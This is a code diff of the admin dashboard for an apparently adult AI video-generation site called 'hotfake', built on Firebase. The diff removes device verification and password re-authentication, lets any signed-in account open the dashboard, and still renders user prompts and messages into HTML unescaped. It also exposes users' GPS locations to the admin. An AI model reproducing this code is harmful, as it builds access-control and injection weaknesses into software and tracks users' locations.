-            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; max-height:200px; overflow-y:auto;">
-                <table style="margin-top:0;"><thead><tr><th>Title</th><th>Plays</th><th>Time</th></tr></thead><tbody id="umHistory"></tbody></table>
-            </div>
-        </div>
-    </div>
-    <button class="btn btn-gray btn-full" onclick="document.getElementById('userModal').style.display='none'">Close Dashboard</button>
   </div>
 </div>
 
@@ -513,678 +109,121 @@
   import { getDatabase, ref, set, update, remove, onValue, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
   import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8",
-    authDomain: "inshelp-f2cba.firebaseapp.com",
-    databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com",
-    projectId: "inshelp-f2cba"
-  };
-  
-  const app = initializeApp(firebaseConfig);
+  const app = initializeApp({ apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" });
   const db = getDatabase(app);
   const auth = getAuth(app); 
+  const adminStatusRef = ref(db, 'settings/admin_status');
 
-  let allVideosRaw = {};
-  let allUsersRaw = {};
-  let isAdminVerified = false; 
-  let adminInitDone = false;
-
-  // --- NEW STABLE ADMIN ID (Fixes Unrecognized Device Bug on Screen Resize) ---
-  function getAdminDeviceId() {
-      let savedAdminId = localStorage.getItem('hotfake_admin_uid');
-      if (savedAdminId) return savedAdminId;
-
-      const cores = navigator.hardwareConcurrency || 2;
-      const ram = navigator.deviceMemory || 2;
-      const ua = navigator.userAgent;
-      let os = "UNK";
-      if (/Windows/i.test(ua)) os = "WIN"; 
-      else if (/Android/i.test(ua)) os = "AND"; 
-      else if (/iP(hone|od|ad)/i.test(ua)) os = "IOS";
-      else if (/Mac/i.test(ua)) os = "MAC";
-
-      const rawString = `ADMIN-${os}-${cores}-${ram}`;
-      let hash = 0; 
-      for (let i = 0; i < rawString.length; i++) hash = ((hash << 5) - hash) + rawString.charCodeAt(i);
-      
-      let newId = `ADM-${Math.abs(hash).toString(36).toUpperCase()}`;
-      localStorage.setItem('hotfake_admin_uid', newId);
-      return newId;
-  }
-
-  // --- LOGIN FLOW ---
   onAuthStateChanged(auth, (user) => {
-    if (user && isAdminVerified) {
-      document.getElementById('loginScreen').style.display = 'none';
-      document.getElementById('adminDash').style.display = 'flex';
+    if (user) {
+      document.getElementById('loginScreen').style.display = 'none'; document.getElementById('adminDash').style.display = 'flex';
+      set(adminStatusRef, true);
+      onValue(ref(db, ".info/connected"), (snap) => { if (snap.val() === true) { onDisconnect(adminStatusRef).set(false); set(adminStatusRef, true); } });
       initAdmin();
-    } else if (!user) {
-      document.getElementById('loginScreen').style.display = 'flex';
-      document.getElementById('loginFormBox').style.display = 'block';
-      document.getElementById('deviceAuthBox').style.display = 'none';
-      document.getElementById('adminDash').style.display = 'none';
-      isAdminVerified = false;
+    } else {
+      document.getElementById('loginScreen').style.display = 'flex'; document.getElementById('adminDash').style.display = 'none';
     }
   });
 
-  document.getElementById('loginBtn').addEventListener('click', () => {
-    const email = document.getElementById('emailInput').value;
-    const pass = document.getElementById('passInput').value;
-    if(!email || !pass) return alert("Enter credentials!");
+  document.getElementById('loginBtn').addEventListener('click', () => signInWithEmailAndPassword(auth, document.getElementById('emailInput').value, document.getElementById('passInput').value));
+  document.getElementById('logoutBtn').addEventListener('click', () => { set(adminStatusRef, false).then(() => signOut(auth).then(() => location.reload())); });
 
-    document.getElementById('loginBtn').innerText = "Verifying...";
-    
-    signInWithEmailAndPassword(auth, email, pass).then(() => {
-        const currentDevId = getAdminDeviceId();
-        
-        get(ref(db, 'settings/admin_sec')).then((snap) => {
-            const secData = snap.val() || {};
-            const savedDev = secData.device;
-            
-            // Device Strict Check
-            if (!savedDev || savedDev === "OPEN" || savedDev === currentDevId) {
-                if(!savedDev || savedDev === "OPEN") update(ref(db, 'settings/admin_sec'), { device: currentDevId });
-                isAdminVerified = true;
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('adminDash').style.display = 'flex';
-                initAdmin();
-            } else {
-                // Device changed -> Need Firebase Password Re-Auth
-                document.getElementById('loginFormBox').style.display = 'none';
-                document.getElementById('deviceAuthBox').style.display = 'block';
-            }
-        }).catch(err => {
-            alert("Security Check Failed: Please check connection.");
-            document.getElementById('loginBtn').innerText = "🔑 Authenticate"; 
-        });
-    }).catch(() => { 
-        alert('Incorrect Email or Password'); 
-        document.getElementById('loginBtn').innerText = "🔑 Authenticate"; 
-    });
-  });
-
-  // Track Admin Presence for User Portal
-  const adminStatusRef = ref(db, 'settings/admin_status');
-  onValue(ref(db, ".info/connected"), (snap) => {
-      if (snap.val() === true && isAdminVerified) {
-          onDisconnect(adminStatusRef).set(false);
-          set(adminStatusRef, true);
-      }
-  });
-
-  document.getElementById('logoutBtn').addEventListener('click', () => { 
-      set(adminStatusRef, false).then(() => signOut(auth).then(() => location.reload())); 
-  });
-
-  // NEW DEVICE VERIFICATION (Via Firebase Password)
-  document.getElementById('verifyDevicePassBtn').addEventListener('click', () => {
-      const enteredPass = document.getElementById('loginDevicePassInput').value;
-      if(!enteredPass) return alert("Enter Password!");
-      
-      document.getElementById('verifyDevicePassBtn').innerText = "Authorizing...";
-      
-      signInWithEmailAndPassword(auth, auth.currentUser.email, enteredPass).then(() => {
-          update(ref(db, 'settings/admin_sec'), { device: getAdminDeviceId() }).then(() => {
-              isAdminVerified = true;
-              document.getElementById('loginScreen').style.display = 'none';
-              document.getElementById('adminDash').style.display = 'flex';
-              initAdmin();
-          });
-      }).catch(() => {
-          alert("❌ Incorrect Password!"); 
-          document.getElementById('verifyDevicePassBtn').innerText = "✅ Authorize Device";
-      });
-  });
-
-  // ==========================================
-  // MAIN ADMIN INITIALIZATION
-  // ==========================================
   function initAdmin() {
-      if(adminInitDone) return;
-      adminInitDone = true;
-
-      // Set admin online status explicitly once verified
-      set(adminStatusRef, true);
-      
-      document.getElementById('displayAdminEmail').innerText = auth.currentUser.email;
-
+      // Sidebar Switch
       document.querySelectorAll('.slink[data-page]').forEach(link => {
         link.addEventListener('click', function() {
-          document.querySelectorAll('.slink').forEach(l => l.classList.remove('active'));
-          this.classList.add('active');
-          document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-          document.getElementById(this.dataset.page).classList.add('active');
+          document.querySelectorAll('.slink').forEach(l => l.classList.remove('active')); this.classList.add('active');
+          document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(this.dataset.page).classList.add('active');
           if (this.dataset.page === 'photosPage') loadSecretPhotos();
         });
       });
 
-      // --- AI ENGINE QUEUE LOGIC (NEW) ---
+      // 1. AI Queue List
       onValue(ref(db, 'ai_requests'), async (snap) => {
-          const data = snap.val() || {};
-          const tb = document.getElementById('aiQueueTbody');
-          tb.innerHTML = '';
-          
-          const requests = Object.keys(data).reverse(); // Newest first
-
+          const tb = document.getElementById('aiQueueTbody'); tb.innerHTML = '';
+          const data = snap.val() || {}; const requests = Object.keys(data).reverse();
           for(let k of requests) {
               const req = data[k];
-              
-              // Fetch User Details specific to this request
-              let userInfo = "Loading...";
-              try {
-                  const userSnap = await get(ref(db, `users/${req.uid}`));
-                  if(userSnap.exists()) {
-                      const u = userSnap.val();
-                      userInfo = `<b>${u.name}</b><br><span style="font-size:0.75rem; color:var(--muted);">${u.email}<br>Age: ${u.age} | ${u.gender}</span>`;
-                  }
-              } catch(e) { userInfo = "User data unavailable"; }
+              let userStr = "Unknown";
+              try { const uSnap = await get(ref(db, `auth_users/${req.uid}`)); if(uSnap.exists()) userStr = `${uSnap.val().name}<br>${uSnap.val().email}`; } catch(e){}
 
-              // Status Badge
-              let badge = '';
-              if(req.status === 'pending') badge = '<span class="badge b-pending">⏳ Pending</span>';
-              if(req.status === 'generating') badge = '<span class="badge b-generating">⚙️ Generating</span>';
-              if(req.status === 'error') badge = `<span class="badge b-error">⚠️ Error</span><br><span style="font-size:0.75rem;">${req.errorMsg}</span>`;
-              if(req.status === 'completed') badge = '<span class="badge b-completed">✅ Completed</span>';
-
-              // Image Html
-              let imgHtml = req.imageUrl ? `<br><a href="${req.imageUrl}" target="_blank" style="color:var(--green); font-size:0.8rem;">🖼️ View Reference Image</a>` : '';
-
-              tb.innerHTML += `
-              <tr>
-                  <td>${userInfo}<br><br><span style="font-size:0.7rem; color:var(--muted);">Soft Deleted by user? ${req.userHidden ? 'YES' : 'NO'}</span></td>
-                  <td>
-                      <div style="background:var(--surf2); padding:10px; border-radius:8px; border:1px solid var(--border); font-size:0.85rem;">
-                          "${req.prompt}"
-                      </div>
-                      ${imgHtml}
-                  </td>
-                  <td>${badge}</td>
-                  <td style="text-align:right; min-width:250px;">
-                      
-                      ${req.status !== 'completed' ? `
-                          <!-- START GENERATING -->
-                          <button class="btn btn-gray" style="padding:0.4rem 0.8rem; margin-bottom:5px; width:100%;" onclick="setAiStatus('${k}', 'generating')">⚙️ Mark 'Generating'</button>
-                          
-                          <!-- SEND ERROR (e.g., GPU Down) -->
-                          <div style="display:flex; gap:5px; margin-bottom:5px;">
-                              <input type="text" id="err_${k}" class="inp" placeholder="e.g. GPU Offline" style="margin:0; padding:0.4rem;">
-                              <button class="btn btn-danger" style="padding:0.4rem;" onclick="sendAiError('${k}')">Send Error</button>
-                          </div>
-                          
-                          <!-- UPLOAD FINAL VIDEO -->
-                          <div style="display:flex; gap:5px;">
-                              <input type="text" id="vid_${k}" class="inp" placeholder="Paste generated video URL" style="margin:0; padding:0.4rem;">
-                              <button class="btn btn-green" style="padding:0.4rem;" onclick="uploadAiVideo('${k}')">Upload</button>
-                          </div>
-                      ` : `
-                          <button class="btn btn-danger" onclick="deleteAiRequest('${k}')">Delete DB Log</button>
-                      `}
-                  </td>
-              </tr>`;
-          }
-      });
-
-      window.setAiStatus = (id, status) => { update(ref(db, `ai_requests/${id}`), { status: status, errorMsg: '' }); };
-      window.sendAiError = (id) => {
-          const msg = document.getElementById(`err_${id}`).value || "GPU not connected. Please try again later or contact the administrator.";
-          update(ref(db, `ai_requests/${id}`), { status: 'error', errorMsg: msg });
-      };
-      window.uploadAiVideo = (id) => {
-          const vidUrl = document.getElementById(`vid_${id}`).value;
-          if(!vidUrl) return alert("Paste a video URL first.");
-          update(ref(db, `ai_requests/${id}`), { status: 'completed', videoUrl: vidUrl, errorMsg: '' });
-      };
-      window.deleteAiRequest = (id) => { if(confirm("Permanently delete this request from database?")) remove(ref(db, `ai_requests/${id}`)); };
-      // --- END AI ENGINE QUEUE LOGIC ---
-      
-      // --- PRICING LOGIC ---
-      onValue(ref(db, 'settings/pricing'), snap => {
-          const p = snap.val() || {};
-          document.getElementById('priceMonthly').value = p.monthly || '';
-          document.getElementById('priceWeekly').value = p.weekly || '';
-          document.getElementById('priceDaily').value = p.daily || '';
-          document.getElementById('priceSingleVid').value = p.singleVid || '';
-          document.getElementById('priceSingleImg').value = p.singleImg || '';
-      });
-
-      document.getElementById('verifyPricingBtn').addEventListener('click', () => {
-          const enteredPass = document.getElementById('pricingPassInput').value;
-          if(!enteredPass) return alert("Please enter your Firebase Password to confirm.");
-          
-          signInWithEmailAndPassword(auth, auth.currentUser.email, enteredPass).then(() => {
-              const newPricing = {
-                  monthly: parseFloat(document.getElementById('priceMonthly').value) || 0,
-                  weekly: parseFloat(document.getElementById('priceWeekly').value) || 0,
-                  daily: parseFloat(document.getElementById('priceDaily').value) || 0,
-                  singleVid: parseFloat(document.getElementById('priceSingleVid').value) || 0,
-                  singleImg: parseFloat(document.getElementById('priceSingleImg').value) || 0,
-              };
-              set(ref(db, 'settings/pricing'), newPricing).then(() => {
-                  alert("🔒 Prices Updated Securely.");
-                  document.getElementById('pricingPassInput').value = '';
-              });
-          }).catch((e) => alert("❌ Incorrect Admin Password!"));
-      });
-
-      // --- ADVANCED KEY GENERATOR LOGIC ---
-      window.toggleSpecificVideo = function() {
-          const type = document.getElementById('pinType').value;
-          document.getElementById('pinVideoWrapper').style.display = (type === 'specific') ? 'block' : 'none';
-      }
-
-      function getCheckedValues(containerId) {
-          const checkboxes = document.querySelectorAll(`#${containerId} input[type="checkbox"]:checked`);
-          let values = []; checkboxes.forEach((cb) => { values.push(cb.value); }); return values;
-      }
-      function generateRandomKey(length=8) {
-          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; let res = '';
-          for (let i = 0; i < length; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
-          return res;
-      }
-
-      document.getElementById('userSearch').addEventListener('input', function() {
-          const allowAllCb = document.getElementById('allowAllUsersCb');
-          if(allowAllCb.checked && this.value.length > 0) {
-              allowAllCb.checked = false;
-              document.querySelectorAll('.user-target-cb').forEach(cb => cb.disabled = false);
-          }
-
-          const filter = this.value.toLowerCase();
-          document.querySelectorAll('.user-chk-lbl').forEach(lbl => {
-              if(lbl.dataset.search.includes(filter)) lbl.style.display = 'flex';
-              else lbl.style.display = 'none';
-          });
-      });
-
-      document.getElementById('verifyKeyBtn').addEventListener('click', () => {
-          let userCount = document.getElementById('allowAllUsersCb').checked ? 1 : document.querySelectorAll('.user-target-cb:checked').length;
-          if(userCount === 0) return alert("Select at least one User or tick 'Allow ALL Users'.");
-
-          const enteredPass = document.getElementById('keygenPassInput').value;
-          if(!enteredPass) return alert("Please enter your Firebase Password to confirm.");
-          
-          signInWithEmailAndPassword(auth, auth.currentUser.email, enteredPass).then(() => {
-              
-              const type = document.getElementById('pinType').value;
-              const targetVideo = document.getElementById('pinVideoSelect').value;
-              const limit = parseInt(document.getElementById('pinLimit').value) || 1;
-              const customPin = document.getElementById('pinCode').value.trim().toUpperCase(); 
-              const bulkCount = parseInt(document.getElementById('pinBulkCount').value) || 1;
-              
-              const osFilters = getCheckedValues('allowedOS');
-              const browserFilters = getCheckedValues('allowedBrowsers');
-              const deviceFilters = getCheckedValues('allowedDevices');
-
-              if(type === 'specific' && !targetVideo) return alert("Select specific content first!");
-
-              let selectedTargets = [];
-              if(document.getElementById('allowAllUsersCb').checked) {
-                  selectedTargets.push("ALL");
-              } else {
-                  document.querySelectorAll('.user-target-cb:checked').forEach(cb => selectedTargets.push(cb.value));
-              }
-
-              const updates = {};
-              selectedTargets.forEach(targetUser => {
-                  const keyData = {
-                      type: type, targetVideo: (type === 'specific') ? targetVideo : "ALL",
-                      targetUser: targetUser, limit: limit,
-                      allowedOS: osFilters.length > 0 ? osFilters : "ANY",
-                      allowedBrowsers: browserFilters.length > 0 ? browserFilters : "ANY",
-                      allowedDevices: deviceFilters.length > 0 ? deviceFilters : "ANY",
-                      created: new Date().toISOString()
-                  };
-
-                  if(bulkCount === 1 && selectedTargets.length === 1 && customPin) {
-                      updates[customPin] = keyData; 
-                  } else {
-                      for(let i=0; i<bulkCount; i++) {
-                          const prefix = customPin ? customPin + "-" : "";
-                          updates[prefix + generateRandomKey(6)] = keyData;
-                      }
-                  }
-              });
-
-              update(ref(db, 'premium_pins'), updates).then(() => {
-                  alert(`✅ Keys Generated Successfully!`);
-                  document.getElementById('keygenPassInput').value = '';
-              });
-
-          }).catch((e) => alert("❌ Incorrect Admin Password!"));
-      });
-
-      // Display PINs
-      onValue(ref(db, 'premium_pins'), snap => {
-          const data = snap.val() || {};
-          const tb = document.getElementById('pinsTbody'); tb.innerHTML = '';
-          Object.keys(data).forEach(k => {
-              const p = data[k];
-              const tBadge = p.type === 'master' ? '<span style="color:var(--green);">👑 Master</span>' : '<span style="color:#ff8c94;">🎯 Specific</span>';
-              let rulesTxt = "";
-              if(p.allowedOS !== "ANY") rulesTxt += `OS: ${p.allowedOS.join(', ')}<br>`;
-              if(p.allowedBrowsers !== "ANY") rulesTxt += `Browsers: ${p.allowedBrowsers.join(', ')}<br>`;
-              if(p.targetUser !== "ALL") rulesTxt += `User: ${p.targetUser}<br>`;
-              if(rulesTxt === "") rulesTxt = "ANY Environment";
+              let b = ''; if(req.status === 'pending') b = '<span class="badge b-pending">⏳ Pending</span>'; else if(req.status === 'generating') b = '<span class="badge b-generating">⚙️ Generating</span>'; else if(req.status === 'error') b = `<span class="badge b-error">⚠️ Error</span><br><small>${req.errorMsg}</small>`; else b = '<span class="badge b-completed">✅ Completed</span>';
+              let img = req.imageUrl ? `<br><a href="${req.imageUrl}" target="_blank" style="color:var(--green); font-size:0.8rem;">🖼️ Image</a>` : '';
 
               tb.innerHTML += `<tr>
-                  <td style="font-family:monospace; color:#fff; font-size:1.1rem;">${k}</td>
-                  <td style="font-size:0.8rem; color:var(--muted);">${tBadge}<br>${rulesTxt}</td>
-                  <td style="font-weight:bold;">${p.limit} left</td>
-                  <td style="text-align:right;"><button class="btn btn-danger" onclick="deletePin('${k}')">Revoke</button></td>
+                  <td><b>${userStr}</b><br><small>Hidden by User? ${req.userHidden?'Yes':'No'}</small></td>
+                  <td><div style="background:var(--surf2); padding:10px; border-radius:8px;">"${req.prompt}"</div>${img}</td>
+                  <td>${b}</td>
+                  <td style="text-align:right;">
+                      ${req.status !== 'completed' ? `
+                          <button class="btn btn-gray" style="padding:0.4rem; width:100%; margin-bottom:5px;" onclick="update(ref(db, 'ai_requests/${k}'), {status:'generating'})">⚙️ Gen</button>
+                          <div style="display:flex; gap:5px; margin-bottom:5px;"><input type="text" id="err_${k}" class="inp" placeholder="Error msg" style="margin:0; padding:0.4rem;"><button class="btn btn-danger" style="padding:0.4rem;" onclick="update(ref(db, 'ai_requests/${k}'), {status:'error', errorMsg:document.getElementById('err_${k}').value})">Err</button></div>
+                          <div style="display:flex; gap:5px;"><input type="url" id="vid_${k}" class="inp" placeholder="Video URL" style="margin:0; padding:0.4rem;"><button class="btn btn-green" style="padding:0.4rem;" onclick="update(ref(db, 'ai_requests/${k}'), {status:'completed', videoUrl:document.getElementById('vid_${k}').value})">Upload</button></div>
+                      ` : `<button class="btn btn-danger" onclick="remove(ref(db, 'ai_requests/${k}'))">Delete DB Log</button>`}
+                  </td>
               </tr>`;
-          });
-      });
-      window.deletePin = (pin) => { if(confirm("Revoke PIN?")) remove(ref(db, `premium_pins/${pin}`)); };
-
-      // --- ADD/EDIT VIDEO LOGIC ---
-      function addPartRow(containerId, title='', url='', image='', dlUrl='') {
-          const div = document.createElement('div'); 
-          div.style.cssText = "display:flex; flex-direction:column; gap:8px; background:var(--surf2); padding:12px; border-radius:8px; border:1px solid var(--border); margin-bottom:12px;";
-          div.innerHTML = `
-            <div style="display:flex; gap:10px; width:100%; align-items:center;">
-                <input type="text" class="inp part-title" placeholder="Episode / Image Title" value="${title}" style="flex:1; margin:0;">
-                <button class="btn btn-gray" onclick="this.parentElement.parentElement.remove()" style="padding:0.6rem 1rem;">X</button>
-            </div>
-            <div style="display:flex; gap:10px; width:100%;">
-                <input type="url" class="inp part-url" placeholder="Video / Image Link" value="${url}" style="flex:1; margin:0;">
-                <input type="url" class="inp part-image" placeholder="Thumbnail URL (Optional)" value="${image}" style="flex:1; margin:0;">
-            </div>
-            <input type="url" class="inp part-download" placeholder="Direct Download Link (Backup)" value="${dlUrl}" style="width:100%; margin:0;">
-          `;
-          document.getElementById(containerId).appendChild(div);
-      }
-      document.getElementById('addPartBtn').addEventListener('click', () => addPartRow('partsContainer'));
-      document.getElementById('editAddPartBtn').addEventListener('click', () => addPartRow('editPartsContainer'));
-
-      document.getElementById('saveVidBtn').addEventListener('click', () => {
-          let parts = [];
-          document.querySelectorAll('#partsContainer > div').forEach(row => {
-              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value; let d = row.querySelector('.part-download').value;
-              if(t && u) parts.push({title: t, url: u, image: i, downloadUrl: d});
-          });
-          const data = {
-              title: document.getElementById('vtitle').value, imageUrl: document.getElementById('vimage').value,
-              videoUrl: document.getElementById('vlink').value || (parts.length > 0 ? parts[0].url : ''),
-              backupLink: document.getElementById('vDownloadLink').value, type: document.getElementById('vtype').value, 
-              isPremium: document.getElementById('vPremium').value, is18Plus: document.getElementById('v18plus').value,
-              parts: parts, addedDate: new Date().toISOString()
-          };
-          if(!data.title || !data.imageUrl) return alert("Title and Image required!");
-          set(ref(db, 'videos/' + Date.now().toString(36)), data).then(() => {
-              alert("Content Added!"); 
-              document.getElementById('vtitle').value = ''; document.getElementById('vimage').value = '';
-              document.getElementById('vlink').value = ''; document.getElementById('vDownloadLink').value = ''; document.getElementById('partsContainer').innerHTML = '';
-          });
+          }
       });
 
-      onValue(ref(db, 'videos'), snap => {
-          allVideosRaw = snap.val() || {};
-          const tb = document.getElementById('vlistTbody'); tb.innerHTML = '';
-          const pinVidSelect = document.getElementById('pinVideoSelect'); pinVidSelect.innerHTML = '';
-          
-          Object.keys(allVideosRaw).reverse().forEach(k => {
-              const v = allVideosRaw[k];
-              tb.innerHTML += `<tr><td>${v.title}</td><td>${v.type}</td><td>${v.isPremium==='true'?'👑 Premium':'Free'}</td>
-                  <td style="text-align:right;"><button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="openEdit('${k}')">✏️ Edit</button><button class="btn btn-red" style="padding:0.4rem 0.8rem;" onclick="deleteVid('${k}')">🗑️</button></td></tr>`;
-              if(v.isPremium === 'true') { pinVidSelect.innerHTML += `<option value="${k}">${v.title}</option>`; }
-          });
-          if(pinVidSelect.innerHTML === '') pinVidSelect.innerHTML = '<option value="">No Premium Content Found</option>';
-      });
-      window.deleteVid = (id) => { if(confirm("Delete content?")) remove(ref(db, 'videos/'+id)); };
-
-      window.openEdit = (id) => {
-          const v = allVideosRaw[id];
-          document.getElementById('editId').value = id; document.getElementById('editTitle').value = v.title;
-          document.getElementById('editImg').value = v.imageUrl; document.getElementById('editLink').value = v.videoUrl;
-          document.getElementById('editDownloadLink').value = v.backupLink || ''; document.getElementById('editType').value = v.type || 'external'; 
-          document.getElementById('editPremium').value = v.isPremium || 'false'; document.getElementById('edit18plus').value = v.is18Plus || 'false';
-          
-          const epContainer = document.getElementById('editPartsContainer'); epContainer.innerHTML = '';
-          if(v.parts) { v.parts.forEach(p => addPartRow('editPartsContainer', p.title, p.url, p.image, p.downloadUrl || '')); }
-          document.getElementById('editModal').style.display = 'flex';
-      };
-
-      document.getElementById('saveEditBtn').addEventListener('click', () => {
-          const id = document.getElementById('editId').value;
-          let parts = [];
-          document.querySelectorAll('#editPartsContainer > div').forEach(row => {
-              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value; let d = row.querySelector('.part-download').value;
-              if(t && u) parts.push({title: t, url: u, image: i, downloadUrl: d});
-          });
-          update(ref(db, 'videos/' + id), {
-              title: document.getElementById('editTitle').value, imageUrl: document.getElementById('editImg').value,
-              videoUrl: document.getElementById('editLink').value || (parts.length > 0 ? parts[0].url : ''),
-              backupLink: document.getElementById('editDownloadLink').value, type: document.getElementById('editType').value, 
-              isPremium: document.getElementById('editPremium').value, is18Plus: document.getElementById('edit18plus').value, parts: parts
-          }).then(() => { alert("Content Updated!"); document.getElementById('editModal').style.display = 'none'; });
-      });
-
-      // --- SUPPORT REQUESTS LOGIC ---
+      // 2. Device Approvals Logic
       onValue(ref(db, 'support_requests'), snap => {
-          const data = snap.val() || {};
-          const tb = document.getElementById('requestsTbody'); tb.innerHTML = '';
+          const data = snap.val() || {}; const tb = document.getElementById('approvalsTbody'); tb.innerHTML = '';
           Object.keys(data).reverse().forEach(k => {
               const req = data[k];
-              let statusBadge = req.status === 'replied' ? '<span style="color:var(--green);">✅ Replied</span>' : req.status === 'hacker_ban' ? '<span style="color:red; font-weight:bold;">☠️ Hacker</span>' : '<span style="color:#f0ad4e;">⏳ Pending</span>';
-
               tb.innerHTML += `<tr>
-                  <td><span style="font-size:0.75rem; color:var(--red); font-family:monospace;">User ID: ${req.regId}</span><br><span style="font-size:0.8rem;"><b>Name:</b> ${req.name}<br><b>Contact:</b> ${req.contactInfo}</span><br>${statusBadge}</td>
-                  <td><div style="font-size:0.85rem; margin-bottom:5px;">${req.message}</div><div style="font-size:0.75rem; color:var(--muted);"><a href="https://www.google.com/maps?q=${req.lat},${req.lon}" target="_blank" style="color:var(--green); text-decoration:underline;">📍 Location</a><br>OS: ${req.os}</div></td>
-                  <td style="text-align:right; min-width: 250px;">
-                      ${req.status !== 'hacker_ban' ? `
-                      <input type="text" id="replyMsg_${k}" placeholder="Custom Admin Reply..." class="inp" style="width:100%; padding:8px; margin-bottom:8px; font-size:0.8rem;">
-                      <div style="display:flex; gap:5px; justify-content:flex-end;">
-                          <button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="viewUser('${req.regId}')">👁️ Profile</button>
-                          <button class="btn btn-green" style="padding:0.4rem 0.8rem;" onclick="sendReply('${k}')">Reply</button>
-                          <button class="btn btn-danger" style="padding:0.4rem 0.8rem;" onclick="markHacker('${k}', '${req.regId}')">☠️ Ban</button>
-                      </div>` : `
-                      <div style="display:flex; gap:5px; justify-content:flex-end;">
-                          <button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="viewUser('${req.regId}')">👁️ Profile</button>
-                          <button class="btn btn-green" style="padding:0.4rem 0.8rem;" onclick="unbanHacker('${k}', '${req.regId}')">🔓 Unban</button>
-                          <button class="btn btn-gray" onclick="deleteRequest('${k}')">Remove Log</button>
-                      </div>`}
+                  <td><span style="color:var(--red); font-family:monospace;">${req.regId}</span><br>Name: ${req.name}</td>
+                  <td>${req.message}<br><a href="https://www.google.com/maps?q=${req.lat},${req.lon}" target="_blank" style="color:var(--green); font-size:0.8rem;">📍 View Location</a></td>
+                  <td style="text-align:right;">
+                      <button class="btn btn-green" style="padding:0.4rem 0.8rem;" onclick="approveDevice('${req.regId}', '${k}')">✅ Approve Access</button>
+                      <button class="btn btn-danger" style="padding:0.4rem 0.8rem;" onclick="banDevice('${req.regId}', '${k}')">🚫 Reject & Ban</button>
                   </td>
               </tr>`;
           });
       });
-      
-      window.sendReply = function(id) {
-          const msg = document.getElementById(`replyMsg_${id}`).value.trim();
-          if(!msg) return alert("Please type a reply message first.");
-          update(ref(db, `support_requests/${id}`), { status: 'replied', adminMessage: msg }).then(() => { alert("Reply sent to user!"); });
-      };
-      
-      window.markHacker = function(reqId, userId) {
-          if(confirm("DANGER: Are you sure you want to PERMANENTLY ban this user for Hacking?")) {
-              update(ref(db, `support_requests/${reqId}`), { status: 'hacker_ban', adminMessage: 'Banned for illegal activities.' });
-              update(ref(db, `users/${userId}`), { banned: true, banReason: 'hack' });
-              alert("User permanently banned ☠️");
-          }
-      };
 
-      // NEW FEATURE: DIRECT UNBAN
-      window.unbanHacker = function(reqId, userId) {
-          if(confirm("Are you sure you want to UNBAN this user?")) {
-              update(ref(db, `support_requests/${reqId}`), { status: 'pending', adminMessage: '' });
-              update(ref(db, `users/${userId}`), { banned: false, banReason: null });
-              alert("User Unbanned Successfully 🔓");
-          }
-      };
-
-      window.deleteRequest = function(id) { if(confirm("Remove this request log?")) remove(ref(db, `support_requests/${id}`)); };
-
-      // --- NEW FEATURE: SUPPORT SEARCH LOGIC ---
-      document.getElementById('supportSearch').addEventListener('input', function() {
-          const filter = this.value.toLowerCase();
-          const rows = document.querySelectorAll('#requestsTbody tr');
-          rows.forEach(row => {
-              const text = row.innerText.toLowerCase();
-              row.style.display = text.includes(filter) ? '' : 'none';
+      window.approveDevice = (devId, reqId) => {
+          // This updates users node and replies to ticket -> which triggers client to enter app!
+          update(ref(db, `users/${devId}`), { deviceApproved: true, banned: false }).then(() => {
+              update(ref(db, `support_requests/${reqId}`), { status: 'replied', adminMessage: 'Access Granted' });
+              alert("Device Approved Successfully!");
           });
-      });
-
-      // --- NEW FEATURE: USER SEARCH LOGIC ---
-      document.getElementById('trackSearch').addEventListener('input', function() {
-          const filter = this.value.toLowerCase();
-          const rows = document.querySelectorAll('#userTableBody tr');
-          rows.forEach(row => {
-              const text = row.innerText.toLowerCase();
-              row.style.display = text.includes(filter) ? '' : 'none';
-          });
-      });
-
-      // --- NEW FEATURE: DELETE USER RECORD LOGIC ---
-      window.deleteUserRecord = function(id) {
-          if(confirm("DANGER: Are you sure you want to permanently delete this user from the database? This action cannot be undone.")) {
-              remove(ref(db, `users/${id}`));
+      };
+      
+      window.banDevice = (devId, reqId) => {
+          if(confirm("Permanently ban this hardware?")) {
+              update(ref(db, `users/${devId}`), { banned: true, banReason: 'hack', deviceApproved: false });
+              update(ref(db, `support_requests/${reqId}`), { status: 'hacker_ban' });
           }
       };
 
-      // --- USERS TRACKING & CHECKBOX LOGIC ---
+      // 3. User Tracking
       onValue(ref(db, 'users'), snap => {
-          allUsersRaw = snap.val() || {};
-          const tb = document.getElementById('userTableBody'); tb.innerHTML = '';
-          const checkList = document.getElementById('userCheckList'); 
-          
-          checkList.innerHTML = `<label><input type="checkbox" id="allowAllUsersCb" value="ALL" checked> <b>🌍 Allow ALL Users (Any Device)</b></label><hr style="width:100%; border-color:rgba(255,255,255,0.1); margin: 5px 0;">`;
-
-          Object.keys(allUsersRaw).reverse().forEach(k => {
-              const u = allUsersRaw[k];
-              const isBanned = u.banned; 
-              const isHacker = u.banReason === 'hack'; 
-              const isLive = u.status === 'Live';
-              
-              // NEW FEATURE: SHOW LIVE/OFFLINE AND BAN STATUS TOGETHER
-              let liveBadge = isLive ? '<span class="badge-active" style="background:#2DC653;color:#fff; margin-right:5px; display:inline-block; margin-bottom:3px;">🟢 Live</span>' : '<span class="badge-banned" style="background:var(--surf3);color:var(--muted); margin-right:5px; display:inline-block; margin-bottom:3px;">🔴 Offline</span>';
